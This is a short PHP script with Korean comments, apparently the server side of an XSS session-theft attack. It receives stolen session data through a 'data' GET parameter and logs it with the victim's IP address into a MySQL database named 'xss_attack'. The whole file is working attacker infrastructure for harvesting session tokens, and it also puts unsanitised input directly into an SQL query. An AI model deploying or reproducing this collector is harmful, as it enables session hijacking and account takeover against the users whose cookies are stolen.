<?php
    $db_conn = new mysqli("127.0.0.1", "root", "", "xss_attack");   // 순서대로 ip, 계정명, 패스워드, db명
    
    $session = $_GET["data"];   // data parameter로 세션정보 탈취
    $remote_ip = $_SERVER["REMOTE_ADDR"];   

    if(!empty($session)){   // 세션값이 없는 경우에만 데이터 insert 처리
        $query = "insert into session_list values(now(), '{$remote_ip}' , '{$session}')";
        $db_conn->query($query);    // 쿼리 실행
    }

    $db_conn->close();
?>